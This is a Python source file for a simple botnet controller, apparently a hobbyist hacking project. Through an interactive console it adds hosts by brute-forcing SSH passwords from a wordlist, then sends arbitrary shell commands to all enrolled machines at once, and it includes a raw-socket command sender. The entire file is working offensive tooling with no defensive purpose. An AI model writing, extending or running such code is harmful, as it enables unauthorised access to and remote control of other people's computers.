import paramiko
import os
import socket

def sendCommand(HOST, PORT, COMMAND):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall(bytes(COMMAND, "utf-8"))


def commandSHH(Host, port, username, password, command):
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    ssh.load_system_host_keys() 
    ssh.connect(Host, 22, username, password)
    sshin, shhout, ssherr = ssh.exec_command(command)
    
    return shhout.read()
class bot:

    def __init__(self, host, user, passwd, ssh, port = 22):
        try:
            if ssh:
                
                if passwd:
                    test = commandSHH(host, port, user, passwd, "ls")
                    if test:
                        self.host = host
                        self.user = user
                        self.passwd = passwd
                        self.port = port
                        self.ssh = 1
                else:
                    passwordAttempts = 0
                    for password in open("C:/Users/Mason Mollenkamp/Desktop/repo/mathon/hackerstuff/Botnet/list.txt").readlines():
                        passwordAttempts += 1
                        try:
                            print(commandSHH(host, 22, user, password, "ls"))
                            print("[!]Password Cracked.", password)
                            test = commandSHH(host, port, user, password, "ls")
                            if test:
                                self.host = host
                                self.user = user
                                self.passwd = password
                                self.port = port
                                self.ssh = 1
                            
                        except Exception as e:
                            print(password, "is not the password. Attempts:", passwordAttempts, e)
                    try:
                        self.ssh
                    except:
                        print("Could not find password.")
                            
            else:
                
                if sendCommand(host, port, "cd"):
                    self.host = host
                    self.port = port
                    self.ssh = 1
        except Exception as e:
            print("Error with ip: {}, ".format(host), e)
    def botnetCommand(self, command):
        try:
            if self.ssh:
                if commandSHH(self.host, self.port, self.user, self.passwd, command):
                    print("Output from", self.host, ":")
                    print(commandSHH(self.host, self.port, self.user, self.passwd, command)) 
                else:
                    print("No output from:", self.host)
            else:
                sendCommand(self.host, self.port, command)
        except Exception as e:
            try:
                print("Error with ip: {}, ".format(self.host), e)
            except:
                print("There was an error while error handling...")

botnet = []

def commandBotnet(command):
    for computer in botnet:
        computer.botnetCommand(command)

def main():
    global botnet
    command = ""
    while command != "Quit":
        command = input("Local>")
        if command == "Botnet Console":
            while input("Quit?") != "quit":
                print("Botnet>")
                commandBotnet(input())
        elif command == "Botnet Add":
            botnet += [bot(input("What is the hosts ip?\n"), input("Username"), input("Password (you can leave this blank for a brute force attack):"), 1, 22)]

if __name__ == "__main__":
    main()
        
